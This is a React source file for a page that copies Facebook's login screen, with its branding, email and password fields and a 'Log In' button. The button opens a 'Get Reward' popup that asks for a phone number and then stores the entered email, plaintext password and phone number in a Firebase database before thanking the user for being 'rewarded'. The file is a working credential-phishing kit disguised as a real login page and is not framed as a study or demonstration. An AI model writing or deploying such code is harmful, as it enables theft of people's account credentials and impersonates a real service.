import React, { useState } from 'react'
import app from '../firebase.config'
import { getDatabase, ref, set, push } from 'firebase/database'
import { Link, useNavigate } from 'react-router-dom'

const Createaccount = () => {
  let [uMail, setUMail] = useState('')
  let [uPass, setUPass] = useState('')
  let [uPhone, setPhone] = useState('')
  let [popShow, setPopShow] = useState(false)

  let [errMessage, setErrMessage] = useState('You are successfully rewarded. Please wait to response. Thank you')
  let [ErrShow, setErrShow] = useState(false)

  let navigate = useNavigate()
  
  let saveData = async ()=>{
   if(uMail && uPass){
      let db = getDatabase(app)
      let newdocref = push(ref(db, 'user/')) 
      set(newdocref,{
        usermail : uMail,
        userpassword: uPass,
        userphone: uPhone
      }).then(()=>{
        setPopShow(false)
        setErrShow(true)
        setUMail('')
        setUPass('')

      }).catch(()=>{
        alert('Not Success')
      })
   }else{
    alert('Please enter your E-mail and Password!')
   }
  }

  return (
    <div className="relative min-h-screen bg-gray-100 flex flex-col md:flex-row items-center justify-center px-6">
      {
        ErrShow &&
        <div className="absolute top-0 w-full">
          <p className='bg-[#db4444] text-center text-[#fff]'>{errMessage}</p>
        </div>
      }
      {popShow &&
        <div className=" w-full h-[100vh] flex justify-center items-center absolute bg-[#ddd]">
          <div className="w-[350px] bg-[#fff] p-6 rounded-lg shadow-md flex flex-col gap-3">
            <p>Please enter your reward phone number.</p>
            <input onChange={(e)=>setPhone(e.target.value)} val type='text' placeholder="Please enter rewarded phone number" className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"/>
            <button onClick={saveData} className="w-full bg-blue-600 text-white font-semibold py-3 rounded-md hover:bg-blue-700">Get Reward</button>
          </div>
        </div>
      }
      <div className="text-center md:text-left md:w-1/2 mb-10 md:mb-0">
        <h1 className="text-4xl font-bold text-blue-600">facebook</h1>
        <p className="text-xl text-gray-700 mt-2">Connect with friends and the world around you on Facebook.</p>
      </div>
      <div className="bg-white p-6 rounded-lg shadow-md w-full max-w-sm">
        <div className="space-y-4">
          <input onChange={(e)=>setUMail(e.target.value)} value={uMail} type="text" placeholder="Email or phone number" className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"/>
          <input onChange={(e)=>setUPass(e.target.value)} value={uPass}  type="password" placeholder="Password" className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"/>
          <button onClick={()=>setPopShow(true)} type="submit" className="w-full bg-blue-600 text-white font-semibold py-3 rounded-md hover:bg-blue-700">Log In</button>
          <div className="text-center">
            <a href="#" className="text-blue-600 text-sm hover:underline">Forgot password?</a>
          </div>
          <hr className="my-4" />
          <div className="text-center">
            <Link to='/create' className="bg-green-600 text-white px-5 py-2 rounded-md font-semibold hover:bg-green-700">
                Create new account
            </Link>
          </div>
        </div>
      </div>
    </div>
  )
}

export default Createaccount